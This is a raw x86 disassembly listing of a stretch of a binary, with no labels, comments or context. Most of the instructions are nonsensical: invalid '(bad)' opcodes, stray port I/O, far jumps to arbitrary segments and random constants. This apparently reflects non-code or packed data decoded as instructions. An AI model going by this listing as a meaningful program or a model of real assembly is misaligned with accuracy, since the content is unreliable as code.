  412e8c:	adc    al,0x73
  412e8e:	pop    esp
  412e8f:	xor    al,0xc8
  412e91:	sub    esi,DWORD PTR [esi]
  412e93:	and    BYTE PTR [edi],bh
  412e95:	sub    eax,0xec71d935
  412e9a:	punpcklbw mm2,DWORD PTR ds:0x14bc09e2
  412ea1:	sbb    DWORD PTR [edi+0x70fe628d],0xfffffff3
  412ea8:	mov    esi,0x4fe116d7
  412ead:	cmp    ebp,DWORD PTR [edi]
  412eaf:	and    dl,BYTE PTR [ebx-0x5d]
  412eb2:	dec    esp
  412eb3:	in     eax,0x29
  412eb5:	cli    
  412eb6:	push   cs
  412eb7:	sbb    edx,eax
  412eb9:	(bad)  
  412eba:	push   DWORD PTR [eax+0x2142036a]
  412ec0:	pop    edi
  412ec1:	sub    ebx,DWORD PTR ds:0xb408c352
  412ec7:	clc    
  412ec8:	test   eax,0xadfc5ac0
  412ecd:	fadd   st(3),st
  412ecf:	fnstsw WORD PTR [esi+0x74]
  412ed2:	mov    ah,0x16
  412ed4:	fwait
  412ed5:	in     al,dx
  412ed6:	shr    BYTE PTR [eax-0x4c],1
  412ed9:	jge    0x412e8b
  412edb:	repnz fwait
  412edd:	mov    ds:0xe0d34c30,al
  412ee2:	iret   
  412ee3:	or     ah,BYTE PTR [esi+esi*4]
  412ee6:	fld    TBYTE PTR [ebx]
  412ee8:	into   
  412ee9:	jge    0x412e86
  412eeb:	jne    0x412f2f
  412eed:	inc    ecx
  412eee:	or     eax,0x5c7b4dd2
  412ef3:	pop    ebx
  412ef4:	test   al,0x46
  412ef6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412ef7:	cmp    ch,dh
  412ef9:	mov    eax,0x3e0624e2
  412efe:	shr    BYTE PTR [edi+0x35baf822],1
  412f04:	imul   DWORD PTR [ebp+ebp*2+0x8c73514]
  412f0b:	ficom  DWORD PTR ds:0xde31965b
  412f11:	dec    esi
  412f12:	cmp    ecx,ebp
  412f14:	imul   ebp,ebp,0xfc3d2437
  412f1a:	sub    al,0xd1
  412f1c:	jns    0x412ee4
  412f1e:	mov    esi,0x5eddaaa7
  412f23:	xor    bh,BYTE PTR [esi-0xa]
  412f26:	cmp    DWORD PTR ds:0x38b36245,ecx
  412f2c:	(bad)  
  412f2d:	fidivr WORD PTR [esp+eax*8]
  412f30:	lahf   
  412f31:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412f32:	xor    DWORD PTR [edi-0x1d7bb201],0x6f
  412f39:	in     eax,0x5d
  412f3b:	je     0x412f1f
  412f3d:	pop    esi
  412f3e:	scas   eax,DWORD PTR es:[edi]
  412f3f:	inc    ebx
  412f40:	neg    bl
  412f42:	mov    al,0x13
  412f44:	or     BYTE PTR [ebx+0xf],al
  412f47:	call   0xcb85:0x8c43b446
  412f4e:	in     al,0xf8
  412f50:	mov    eax,ds:0xe415cbfd
  412f55:	ja     0x412f9f
  412f57:	adc    BYTE PTR [esi-0x40],ch
  412f5a:	xor    ebx,DWORD PTR gs:[esi-0x68]
  412f5e:	push   ebp
  412f5f:	adc    BYTE PTR [esi-0x78],cl
  412f62:	imul   edi,DWORD PTR [ebp-0x3d],0xfffffff6
  412f66:	sub    al,0xc5
  412f68:	pop    ecx
  412f69:	jo     0x412f75
  412f6b:	fcmovbe st,st(2)
  412f6d:	fist   WORD PTR [esi+0xfa2067c]
  412f73:	sbb    al,0x10
  412f75:	js     0x412f41
  412f77:	pop    ebp
  412f78:	xchg   ecx,eax
  412f79:	pop    esi
  412f7a:	cmp    edx,DWORD PTR [ebp+0x53]
  412f7d:	fsub   QWORD PTR [eax+0x4c60a5cc]
  412f83:	dec    edx
  412f84:	cwde   
  412f85:	xchg   ebp,eax
  412f86:	sub    DWORD PTR [esi-0x54f61e85],ebp
  412f8c:	ret    
  412f8d:	mov    dl,0x75
  412f8f:	jecxz  0x412fbc
  412f91:	ret    
  412f92:	test   al,0xec
  412f94:	loope  0x412f7d
  412f96:	int3   
  412f97:	outs   dx,DWORD PTR ds:[esi]
  412f98:	ret    
  412f99:	sahf   
  412f9a:	adc    esp,ebp
  412f9c:	mov    edi,0x5fcc6a29
  412fa1:	outs   dx,DWORD PTR ds:[esi]
  412fa2:	sbb    cl,BYTE PTR [esi]
  412fa4:	in     eax,0xfa
  412fa6:	ret    
  412fa7:	aas    
  412fa8:	xchg   ecx,eax
  412fa9:	ret    
  412faa:	xchg   DWORD PTR es:[ebx+0x7d],ebx
  412fae:	mov    dl,0x9f
  412fb0:	pop    edx
  412fb1:	test   al,0x7b
  412fb3:	sbb    al,0xdf
  412fb5:	ds cwde 
  412fb7:	fs jmp 0x4d568160
  412fbd:	aam    0xa1
  412fbf:	movd   edx,mm7
  412fc2:	add    al,0xd0
  412fc4:	imul   DWORD PTR [esi+0x4ca4efd0]
  412fca:	shl    esi,cl
  412fcc:	xor    eax,0x1dddbe74
  412fd1:	push   cs
  412fd2:	popf   
  412fd3:	push   eax
  412fd4:	and    BYTE PTR [ebx+0x64d33854],0x52
  412fdb:	int3   
  412fdc:	fst    DWORD PTR [esp+ebx*1]
  412fdf:	mov    esi,0x401014b9
  412fe4:	call   0x1e765a43
  412fe9:	rcr    dl,cl
  412feb:	or     al,0x69
  412fed:	test   BYTE PTR [esi],dh
  412fef:	and    DWORD PTR [edi],ebx
  412ff1:	fadd   DWORD PTR [ebx+edi*1-0x14e26bc1]
  412ff8:	fild   WORD PTR ds:0xe79132df
  412ffe:	lds    eax,FWORD PTR [edx+0x552d8703]
  413004:	sbb    esp,DWORD PTR [ebp-0x67b7a679]
  41300a:	mov    ebp,0x8da32d01
  41300f:	pop    edi
  413010:	add    BYTE PTR [edx+esi*2+0x25],bl
  413014:	pop    ebx
  413015:	jg     0x412fc2
  413017:	inc    ecx
  413018:	test   DWORD PTR [edx],edx
  41301a:	outs   dx,BYTE PTR ds:[esi]
  41301b:	jno    0x412ff0
  41301d:	fwait
  41301e:	pop    ds
  41301f:	xor    bh,BYTE PTR ds:0x2a759918
  413025:	pop    ss
  413026:	push   ss
  413027:	jb     0x4130a2
  413029:	dec    edx
  41302a:	ret    
  41302b:	push   ds
  41302c:	push   edi
  41302d:	sbb    DWORD PTR [esi],0xcc1df4f0
  413033:	xor    al,0x2a
  413035:	cmp    eax,0x6d0d326f
  41303a:	cmp    eax,edi
  41303c:	pop    ebx
  41303d:	mov    bl,al
  41303f:	xlat   BYTE PTR ds:[ebx]
  413040:	out    dx,eax
  413041:	mov    ds:0x4c205de,al
  413046:	mov    ch,BYTE PTR [ebp+0x4f]
  413049:	les    ecx,FWORD PTR [edx+0x67]
  41304c:	(bad)  
  41304d:	inc    edi
  41304e:	mov    esp,0xf6aa459a
  413053:	cs pop ss
  413055:	mov    DWORD PTR [esi+0x5d8f14a0],edx
  41305b:	add    cl,bh
  41305d:	iret   
  41305e:	mov    bl,0x28
  413060:	xor    al,0x2d
  413062:	push   edx
  413063:	xchg   esp,eax
  413064:	scas   al,BYTE PTR es:[edi]
  413065:	popa   
  413066:	retf   0xe936
  413069:	mov    eax,0x2a8c613e
  41306e:	inc    edi
  41306f:	mov    eax,ebp
  413071:	fbstp  TBYTE PTR [edi-0x28dfd28f]
  413077:	mul    BYTE PTR [edx-0x66]
  41307a:	popf   
  41307b:	pop    ss
  41307c:	std    
  41307d:	jge    0x413082
  41307f:	je     0x41305f
  413081:	mov    ebp,0xf1d95175
  413086:	jg     0x4130f6
  413088:	(bad)  
  41308a:	xchg   ebp,eax
  41308b:	xchg   esp,eax
  41308c:	out    dx,al
  41308d:	inc    edi
  41308e:	add    BYTE PTR [edx-0x79],bh
  413091:	xchg   ebp,eax
  413092:	es aam 0x70
  413095:	and    al,0x2e
  413097:	std    
  413098:	xchg   ebx,eax
  413099:	int    0x6
  41309b:	ja     0x41302f
  41309d:	cwde   
  41309e:	push   ecx
  41309f:	push   esp
  4130a0:	dec    esp
  4130a1:	dec    edx
  4130a2:	aaa    
  4130a3:	js     0x4130a7
  4130a5:	mov    DWORD PTR [ebp+0x10470151],esi
  4130ab:	pop    ds
  4130ac:	arpl   dx,sp
  4130ae:	mov    cl,0x74
  4130b0:	xor    DWORD PTR [esi+0x3c],0x75
  4130b4:	jg     0x41306c
  4130b6:	dec    edx
  4130b7:	adc    ebp,esp
  4130b9:	dec    esp
  4130ba:	(bad)  
  4130bb:	jl     0x4130e7
  4130bd:	xor    al,0x11
  4130bf:	dec    edx
  4130c0:	mov    ebp,0x21607055
  4130c5:	jo     0x41308f
  4130c7:	sub    eax,0x37282a1d
  4130cc:	ins    DWORD PTR es:[edi],dx
  4130cd:	pop    ecx
  4130ce:	fs out 0x66,eax
  4130d1:	mov    al,0x7b
  4130d3:	mov    bl,0x92
  4130d5:	pop    DWORD PTR [edx-0x1a]
  4130d8:	shl    DWORD PTR [ebp+edx*8-0x2c8bedcc],1
  4130df:	mov    cl,0x5c
  4130e1:	xor    BYTE PTR [ebx-0x50],cl
  4130e4:	adc    DWORD PTR [edx],edx
  4130e6:	daa    
  4130e7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4130e8:	(bad)  
  4130e9:	(bad)  
  4130ea:	and    ebx,esp
  4130ec:	pop    esi
  4130ed:	pushf  
  4130ee:	mov    bl,0xdc
  4130f0:	sbb    BYTE PTR [ecx+0x17],cl
  4130f3:	test   BYTE PTR [edx-0x5101a589],bh
  4130f9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4130fa:	dec    ebx
  4130fb:	outs   dx,BYTE PTR ds:[esi]
  4130fc:	adc    BYTE PTR [ebx+0x6adce87d],dl
  413102:	push   es
  413103:	xchg   ebp,eax
  413104:	retf   0x8ce2
  413107:	enter  0xf542,0x89
  41310b:	ins    BYTE PTR es:[edi],dx
  41310c:	lods   eax,DWORD PTR ds:[esi]
  41310d:	dec    esi
  41310e:	xchg   ecx,eax
  41310f:	push   0x28
  413111:	and    eax,0x55a7267d
  413116:	sbb    BYTE PTR [eax-0x1e],dl
  413119:	adc    BYTE PTR [ecx+0x356c5557],0x65
  413120:	pop    ss
  413121:	pop    eax
  413122:	push   ds
  413123:	push   ebx
  413124:	outs   dx,DWORD PTR ds:[esi]
  413125:	inc    eax
  413126:	push   0xcd64acba
  41312b:	add    DWORD PTR [ebx+eiz*2],esp
  41312e:	jbe    0x413180
  413130:	ret    
  413131:	je     0x41318d
  413133:	retf   0xdf1b
  413136:	inc    eax
  413137:	mov    dh,0x17
  413139:	les    edi,FWORD PTR ds:0xfda1ba82
  41313f:	out    0xf6,al
  413141:	icebp  
  413142:	jns    0x4130f6
  413144:	push   es
  413145:	bound  ebp,QWORD PTR [eax-0x2768f226]
  41314b:	lods   al,BYTE PTR ds:[esi]
  41314c:	pop    ebx
  41314d:	pushf  
  41314e:	jmp    0x9f98df22
  413153:	dec    ecx
  413154:	xchg   esp,eax
  413155:	xchg   DWORD PTR [ecx+edi*4+0x1f],esi
  413159:	mov    edx,0x92332656
  41315e:	or     eax,0x486d3f8b
  413163:	mov    eax,ds:0x74b32888
  413168:	mov    dh,0xfb
  41316a:	sub    al,0xcc
  41316c:	or     ah,BYTE PTR [eax-0x14ef4245]
  413172:	adc    bl,BYTE PTR [edx-0x5a]
  413175:	push   ebp
  413176:	add    ebx,esi
  413178:	mov    bl,BYTE PTR [ecx+0x1f5049b0]
  41317e:	cmp    BYTE PTR [esi+0x1],dh
  413181:	inc    edx
  413182:	cmp    al,0xec
  413184:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413185:	adc    edx,DWORD PTR [ebp+0x7d]
  413188:	adc    al,BYTE PTR ds:0x28c9d9c8
  41318e:	push   ebp
  41318f:	loop   0x413171
  413191:	add    ch,BYTE PTR [eax-0x5e]
  413194:	addr16 jge 0x4131fc
  413197:	dec    ebx
  413198:	shr    al,cl
  41319a:	push   esi
  41319b:	mov    WORD PTR [eax-0x32e1f1e],gs
  4131a1:	sub    BYTE PTR [ecx],0x21
  4131a4:	aas    
  4131a5:	bnd jae 0x4131d7
  4131a8:	push   0xffffffeb
  4131aa:	or     esi,DWORD PTR [ebx]
  4131ac:	out    0x2d,al
  4131ae:	ja     0x4131c4
  4131b0:	pop    esi
  4131b1:	pop    ds
  4131b2:	pop    ss
  4131b3:	xor    ah,dl
  4131b5:	xlat   BYTE PTR es:[ebx]
  4131b7:	les    eax,FWORD PTR [eax]
  4131b9:	mov    dl,0xbb
  4131bb:	pop    ecx
  4131bc:	fadd   DWORD PTR [eax]
  4131be:	mov    ah,0xb4
  4131c0:	or     al,0x8f
  4131c2:	pusha  
  4131c3:	push   ds
  4131c4:	rcr    BYTE PTR [ebx+0x53],1
  4131c7:	push   DWORD PTR [ebp+0x703d354a]
  4131cd:	loope  0x4131b3
  4131cf:	pop    ss
  4131d0:	or     eax,0x5581bd0e
  4131d5:	inc    edi
  4131d6:	pop    esi
  4131d7:	lahf   
  4131d8:	mov    dh,0x5e
  4131da:	nop
  4131db:	mov    eax,0x6f6d7827
  4131e0:	and    ecx,DWORD PTR [eax+0x7ffff9f7]
  4131e6:	mov    ecx,0xbe2c9ef6
  4131eb:	cwde   
  4131ec:	sub    ecx,edx
  4131ee:	jecxz  0x4131b3
  4131f0:	clc    
  4131f1:	aas    
  4131f2:	ins    BYTE PTR es:[edi],dx
  4131f3:	call   DWORD PTR cs:[ecx+0x40]
  4131f7:	jno    0x413186
  4131f9:	pop    ebx
  4131fa:	fbstp  TBYTE PTR [ebx-0x11]
  4131fd:	dec    ebp
  4131fe:	call   0x12f:0x3e6a3a1f
  413205:	xchg   esi,eax
  413206:	call   0x8231:0x98700f21
  41320d:	mov    bl,cl
  41320f:	inc    ecx
  413210:	and    al,0xa1
  413212:	stos   DWORD PTR es:[edi],eax
  413213:	mov    bh,0x17
  413215:	(bad)  
  413216:	sub    BYTE PTR [ebx-0x4f1586e9],bh
  41321c:	vmread DWORD PTR [edx+0x5311b8b],esi
  413223:	push   0x1b5cdae0
  413228:	out    dx,eax
  413229:	xor    eax,0x38ce3f9
  41322e:	mov    al,0xf1
  413230:	adc    al,0x2f
  413232:	ret    0xb011
  413235:	mov    ah,0xa9
  413237:	ret    
  413238:	pushf  
  413239:	sbb    BYTE PTR [edx-0x77],dh
  41323c:	sub    bh,dl
  41323e:	inc    edi
  41323f:	jae    0x413211
  413241:	loope  0x413254
  413243:	jnp    0x4132c4
  413245:	ins    DWORD PTR es:[edi],dx
  413246:	loopne 0x413280
  413248:	xor    esp,DWORD PTR [edx-0x54]
  41324b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41324c:	pop    ss
  41324d:	lea    esp,[ebp-0x12]
  413250:	xchg   ebp,eax
  413251:	imul   edi,DWORD PTR [eax+eiz*8],0x4e358ceb
  413258:	push   esi
  413259:	xor    al,0xa3
  41325b:	stos   DWORD PTR es:[edi],eax
  41325c:	aad    0x39
  41325e:	dec    edi
  41325f:	(bad)  
  413260:	into   
  413261:	je     0x413251
  413263:	xor    DWORD PTR [eax+0x77],esp
  413266:	popf   
  413267:	popf   
  413268:	je     0x4132b2
  41326a:	push   esp
  41326b:	xor    eax,DWORD PTR [edi+0x33]
  41326e:	or     al,0x98
  413270:	add    al,BYTE PTR [edx+0x4d65f71]
  413276:	jmp    0xc6427499
  41327b:	out    dx,al
  41327c:	lds    ebp,FWORD PTR [edx-0x36]
  41327f:	jnp    0x413266
  413281:	or     cl,BYTE PTR [edi]
  413283:	mov    ds:0xe01a9dd3,al
  413288:	jle    0x413259
  41328a:	mov    ds,WORD PTR [ebp+ecx*1-0x74f5fe2e]
  413291:	xor    BYTE PTR [ecx+ecx*1-0x3f031afd],al
  413298:	xchg   edi,eax
  413299:	or     eax,0xfad887c5
  41329e:	jle    0x4132c9
  4132a0:	arpl   sp,si
  4132a2:	(bad)  
  4132a3:	outs   dx,DWORD PTR ds:[esi]
  4132a4:	jecxz  0x41327f
  4132a6:	dec    eax
  4132a7:	fild   QWORD PTR [esi]
  4132a9:	loope  0x4132a4
  4132ab:	int3   
  4132ac:	dec    eax
  4132ad:	icebp  
  4132ae:	inc    eax
  4132af:	test   ax,0x71de
  4132b3:	or     esp,0x88eb858
  4132b9:	add    dh,dl
  4132bb:	mov    BYTE PTR [ebp+0x6b],0x17
  4132bf:	in     al,dx
  4132c0:	leave  
  4132c1:	fldcw  WORD PTR [edi+0x36]
  4132c4:	or     edx,esi
  4132c6:	in     al,0xb0
  4132c8:	out    0x99,eax
  4132ca:	loopne 0x413307
  4132cc:	mov    eax,0x695dd4b0
  4132d1:	and    DWORD PTR [ecx],edx
  4132d3:	stos   BYTE PTR es:[edi],al
  4132d4:	call   DWORD PTR [esi-0x6f]
  4132d7:	in     al,0x62
  4132d9:	and    DWORD PTR [eax-0x696da606],edi
  4132df:	adc    DWORD PTR [esi-0xd],ebx
  4132e2:	retf   
  4132e3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4132e4:	scas   eax,DWORD PTR es:[edi]
  4132e5:	scas   eax,DWORD PTR es:[edi]
  4132e6:	jecxz  0x41326a
  4132e8:	retf   0xff9e
  4132eb:	jnp    0x413355
  4132ed:	fisub  DWORD PTR [edx]
  4132ef:	test   DWORD PTR [edx+0x2b],0x4e3bdec2
  4132f6:	stc    
  4132f7:	(bad)  
  4132f8:	dec    ebx
  4132f9:	addr16 or al,0x8b
  4132fc:	and    al,0xd3
  4132fe:	in     eax,dx
  4132ff:	cld    
  413300:	mov    bh,0xe7
  413302:	sti    
  413303:	test   DWORD PTR ds:0x51e566ee,esi
  413309:	sbb    BYTE PTR [edx],bl
  41330b:	in     eax,dx
  41330c:	mov    cl,0x1
  41330e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41330f:	call   0xf4881277
  413314:	mov    ds:0x517b1530,eax
  413319:	in     al,0x8e
  41331b:	sub    esp,DWORD PTR [esi-0x32]
  41331e:	mov    dl,0x1
  413320:	or     BYTE PTR [esi],0x39
  413323:	sub    bh,BYTE PTR [ebp-0x63]
  413326:	cwde   
  413327:	ficom  WORD PTR ds:0xfcdc5a29
  41332d:	or     al,0x53
  41332f:	jae    0x41335a
  413331:	jmp    0xe3bd:0x25e3225f
  413338:	jno    0x4133b4
  41333a:	add    edi,esp
  41333c:	xchg   edx,eax
  41333d:	jae    0x41334e
  41333f:	dec    eax
  413340:	xchg   edx,eax
  413341:	pop    eax
  413342:	add    BYTE PTR [ebx],cl
  413344:	(bad)  
  413345:	cdq    
  413346:	retf   0x7f6d
  413349:	out    0x76,eax
  41334b:	inc    esi
  41334c:	out    dx,al
  41334d:	dec    ebp
  41334e:	pop    ebp
  41334f:	dec    ebx
  413350:	aaa    
  413351:	and    esi,edx
  413353:	dec    edi
  413354:	call   0xc2c4:0xde51a17
  41335b:	ins    BYTE PTR es:[edi],dx
  41335c:	jbe    0x41330b
  41335e:	jp     0x4133aa
  413360:	xor    BYTE PTR [esi+0x7c],al
  413363:	mov    al,ds:0x54a01b49
  413368:	push   esi
  413369:	add    al,0xea
  41336b:	sbb    al,0x22
  41336d:	ret    
  41336e:	dec    esp
  41336f:	jl     0x41330a
  413371:	shl    DWORD PTR [ebp-0x4fb2d00],1
  413377:	and    al,ch
  413379:	mov    cl,0x68
  41337b:	pop    edx
  41337c:	cmc    
  41337d:	jo     0x4133bb
  41337f:	xchg   esp,eax
  413380:	in     eax,0x6
  413382:	xchg   ecx,eax
  413383:	ror    DWORD PTR [edx],1
  413385:	xlat   BYTE PTR ds:[ebx]
  413386:	push   esi
  413387:	or     ch,BYTE PTR [esi-0x7406ce82]
  41338d:	(bad)  
  41338e:	mov    bh,ch
  413390:	int    0x65
  413392:	jae    0x41339e
  413394:	(bad)  
  413396:	loopne 0x413354
  413398:	push   ebp
  413399:	push   ds
  41339a:	pop    edx
  41339b:	push   0x891c73d8
  4133a0:	mov    ch,0x83
  4133a2:	fwait
  4133a3:	into   
  4133a4:	inc    ecx
  4133a5:	and    BYTE PTR [ebx-0x1aea4000],0x5c
  4133ac:	mov    eax,0x2fb24350
  4133b1:	icebp  
  4133b2:	mov    DWORD PTR [eax-0xe88d312],esi
  4133b8:	mov    ah,0xf2
  4133ba:	pushf  
  4133bb:	ret    
  4133bc:	mov    cl,0x9
  4133be:	lods   eax,DWORD PTR ds:[esi]
  4133bf:	dec    esp
  4133c0:	adc    DWORD PTR [edi],0xffffff98
  4133c3:	xor    edx,0x6f7666ac
  4133c9:	xchg   ecx,eax
  4133ca:	test   BYTE PTR [edi],bl
  4133cc:	sbb    eax,0xa5c698f9
  4133d1:	ror    BYTE PTR [ebx],1
  4133d3:	mov    bh,0xb
  4133d5:	iret   
  4133d6:	sahf   
  4133d7:	imul   bh
  4133d9:	inc    esi
  4133da:	add    eax,0xd76ff6fd
  4133df:	add    al,0x9b
  4133e1:	mov    cl,0xd2
  4133e3:	xlat   BYTE PTR ds:[ebx]
  4133e4:	dec    edi
  4133e5:	call   0xfa42:0xf72e2f9f
  4133ec:	add    ecx,DWORD PTR [edi+0x1e59a736]
  4133f2:	outs   dx,BYTE PTR ds:[esi]
  4133f3:	iret   
  4133f4:	fprem1 
  4133f6:	ss push ecx
  4133f8:	sahf   
  4133f9:	jbe    0x4133d7
  4133fb:	fsub   st(5),st
  4133fd:	test   BYTE PTR [esi-0x39],cl
  413400:	test   al,0xa5
  413402:	adc    DWORD PTR [ebx+0x45],ebp
  413405:	nop
  413406:	jl     0x41346d
  413408:	(bad)  
  413409:	sti    
  41340a:	pop    eax
  41340b:	je     0x4133b5
  41340d:	call   0x9dd3c986
  413412:	mov    ch,al
  413414:	sub    ch,BYTE PTR [edi-0x465650d0]
  41341a:	push   esi
  41341b:	out    0xef,eax
  41341d:	test   eax,0xcaf136ce
  413422:	cmp    al,BYTE PTR [ecx-0x75f10142]
  413428:	cld    
  413429:	jo     0x4133ad
  41342b:	daa    
  41342c:	rcr    DWORD PTR [ecx+0x50666c0e],1
  413432:	pusha  
  413433:	pusha  
  413434:	dec    edx
  413435:	push   es
  413436:	xor    ah,dh
  413438:	adc    BYTE PTR [ebx],al
  41343a:	mov    al,ds:0xb62de6b0
  41343f:	inc    esp
  413440:	sbb    DWORD PTR [ecx+0x6f],esi
  413443:	leave  
  413444:	mov    eax,ds:0x85ee75a5
  413449:	(bad)  
  41344a:	cld    
  41344b:	and    al,0xcb
  41344d:	mov    al,ds:0xacd0c68f
  413452:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413453:	std    
  413454:	mov    es,ecx
  413456:	inc    edi
  413457:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413458:	jecxz  0x413450
  41345a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41345b:	stos   BYTE PTR es:[edi],al
  41345c:	aad    0x89
  41345e:	mov    dl,0x19
  413460:	jns    0x413423
  413462:	dec    esi
  413463:	and    BYTE PTR [eax+0x20],al
  413466:	and    eax,0xd01fff32
  41346b:	bound  ebx,QWORD PTR [ebx]
  41346d:	add    dl,0x96
  413470:	je     0x4134d6
  413472:	cmc    
  413473:	xchg   DWORD PTR [ebx-0x6584eb75],edx
  413479:	push   ebx
  41347a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41347b:	and    esp,ebp
  41347d:	pop    ss
  41347e:	mov    cl,0xc5
  413480:	(bad)
  413483:	pop    DWORD PTR [esi+0x51]
  413486:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413487:	arpl   WORD PTR [eax],dx
  413489:	xchg   edx,eax
  41348a:	aam    0xa0
  41348c:	fwait
  41348d:	pusha  
  41348e:	ret    
  41348f:	inc    ebp
  413490:	stos   DWORD PTR es:[edi],eax
  413491:	ins    BYTE PTR es:[edi],dx
  413492:	adc    DWORD PTR [edx-0x41],ebp
  413495:	leave  
  413496:	push   0x24
  413498:	and    ch,BYTE PTR [edi-0x38]
  41349b:	jle    0x41346d
  41349d:	or     al,0x83
  41349f:	pop    ebx
  4134a0:	fidivr DWORD PTR [edi+0x1995155f]
  4134a6:	jnp    0x413472
  4134a8:	pop    ebx
  4134a9:	fisttp WORD PTR [edi-0x44]
  4134ac:	ror    BYTE PTR [edi],1
  4134ae:	inc    ebp
  4134af:	call   0x60d5b473
  4134b4:	dec    edx
  4134b5:	scas   al,BYTE PTR es:[edi]
  4134b6:	add    eax,0xb22c3fe4
  4134bb:	mov    dh,0x2f
  4134bd:	mov    ch,0xc3
  4134bf:	mov    esi,DWORD PTR [ebx+eiz*4-0x63]
  4134c3:	fimul  DWORD PTR [ecx]
  4134c5:	hlt    
  4134c6:	xor    dl,ch
  4134c8:	mov    ebx,0x90c1dc8
  4134cd:	iret   
  4134ce:	mov    dl,dh
  4134d0:	gs mov ah,0x70
  4134d3:	mov    ebp,0x4b9c751e
  4134d8:	outs   dx,BYTE PTR ds:[esi]
  4134d9:	test   al,0x9c
  4134db:	inc    DWORD PTR [edi]
  4134dd:	or     eax,DWORD PTR ds:0xd42e596d
  4134e3:	mov    edx,0x3ac35c0
  4134e8:	cdq    
  4134e9:	adc    eax,0x28fd1d4e
  4134ee:	or     BYTE PTR [edx],bl
  4134f0:	jnp    0x4134cb
  4134f2:	adc    al,0xe8
  4134f4:	adc    BYTE PTR [edi-0x3cc5ce7f],cl
  4134fa:	dec    ecx
  4134fb:	aas    
  4134fc:	jne    0x41356b
  4134fe:	jne    0x4134dc
  413500:	imul   edx
  413502:	push   edi
  413503:	dec    ebp
  413504:	xchg   BYTE PTR [eax],ch
  413506:	dec    ecx
  413507:	dec    ebp
  413508:	pop    ebp
  413509:	test   al,0x86
  41350b:	or     edx,DWORD PTR [eax+0x57]
  41350e:	das    
  41350f:	cmp    eax,0xfd811659
  413514:	mov    DWORD PTR ds:0x313e202e,eax
  41351a:	mov    ds:0xbd51829a,al
  41351f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413520:	xchg   cl,bl
  413522:	jbe    0x4134a8
  413524:	mov    eax,ds:0x1321ccfb
  413529:	inc    ebp
  41352a:	pop    ds
  41352b:	add    eax,0xd0092988
  413530:	sbb    al,0x8c
  413532:	pop    ss
  413533:	xor    BYTE PTR [eax],bh
  413535:	je     0x413512
  413537:	dec    ebp
  413538:	mov    ah,0x32
  41353a:	pavgw  mm2,QWORD PTR [esi-0x4fdf83cd]
  413541:	mov    DWORD PTR [eax-0x3f868d29],ecx
  413547:	das    
  413548:	(bad)  
  413549:	mov    esi,0x4b31c5c7
  41354e:	push   ebx
  41354f:	sbb    eax,0xcf76c28d
  413554:	mov    dl,0xc7
  413556:	dec    esi
  413557:	int3   
  413558:	int3   
  413559:	or     BYTE PTR ds:[edx-0x8],bl
  41355d:	fs cli 
  41355f:	mov    ebp,0xabc3f0fa
  413564:	dec    eax
  413565:	mov    BYTE PTR cs:[ecx+0x1c],dl
  413569:	xlat   BYTE PTR ds:[ebx]
  41356a:	push   esi
  41356b:	leave  
  41356c:	mov    ebp,0x30cb7e2a
  413571:	pop    eax
  413572:	push   edx
  413573:	mov    edi,0xaacec03d
  413578:	cmp    BYTE PTR cs:[eax-0x45],bh
  41357c:	adc    al,0xc6
  41357e:	mov    cr7,eax
  413581:	xchg   esp,eax
  413582:	xchg   ebx,eax
  413583:	popf   
  413584:	xchg   esp,eax
  413585:	and    BYTE PTR [ebx+0x4cfdaf83],al
  41358b:	push   edx
  41358c:	adc    eax,0x43598b06
  413591:	adc    eax,DWORD PTR [esp+edx*2-0xe]
  413595:	(bad)  
  413596:	dec    eax
  413597:	test   eax,0xb30352c
  41359c:	loopne 0x4135fc
  41359e:	xor    eax,DWORD PTR [ebp+0x52]
  4135a1:	mov    ds:0x7a6a59ac,al
  4135a6:	xor    esp,DWORD PTR [ecx+0x6c0c25aa]
  4135ac:	rcl    BYTE PTR [ebx],cl
  4135ae:	pop    esp
  4135af:	test   eax,0xcb20254d
  4135b4:	adc    BYTE PTR [eax+edx*4+0x51f5a564],al
  4135bb:	retf   0xb152
  4135be:	popa   
  4135bf:	push   edi
  4135c0:	ret    
  4135c1:	jno    0x4135ec
  4135c3:	(bad)  
  4135c4:	jb     0x41358e
  4135c6:	cmp    DWORD PTR [ecx+0x6151a1a1],0x7c1c02c5
  4135d0:	push   esp
  4135d1:	push   esi
  4135d2:	imul   BYTE PTR [eax+0x6f4d559]
  4135d8:	cmp    eax,DWORD PTR [edi-0x2a7e728c]
  4135de:	xchg   esi,eax
  4135df:	sub    ch,BYTE PTR [eax-0x43]
  4135e2:	and    esi,DWORD PTR [edi+0x19760143]
  4135e8:	test   al,0x7e
  4135ea:	jle    0x4135b5
  4135ec:	adc    DWORD PTR [edx+esi*8-0x4b],eax
  4135f0:	arpl   WORD PTR [edi],bx
  4135f2:	sti    
  4135f3:	cmp    dl,bh
  4135f5:	jns    0x413629
  4135f7:	cmp    edi,DWORD PTR [ecx+ecx*4+0x56]
  4135fb:	jne    0x413660
  4135fd:	enter  0x1028,0xd2
  413601:	jmp    FWORD PTR [edi-0x73aa050]
  413607:	jp     0x41367f
  413609:	add    dl,BYTE PTR [ecx]
  41360b:	adc    BYTE PTR [ebx+0x4e],0x56
  41360f:	push   ebp
  413610:	(bad)  
  413611:	jbe    0x4135d6
  413613:	pushf  
  413614:	jmp    0x96c2:0x3d6f8cf1
  41361b:	pop    ebp
  41361c:	dec    ecx
  41361d:	popf   
  41361e:	int    0xa0
  413620:	into   
  413621:	jge    0x413664
  413623:	mov    ebp,0x69343765
  413628:	jno    0x413663
  41362a:	outs   dx,DWORD PTR ds:[esi]
  41362b:	clc    
  41362c:	adc    eax,0x16de5066
  413631:	aad    0x72
  413633:	test   DWORD PTR [edx],esp
  413635:	sbb    DWORD PTR [ebp-0x14f757a9],ecx
  41363b:	lock cmp al,0x85
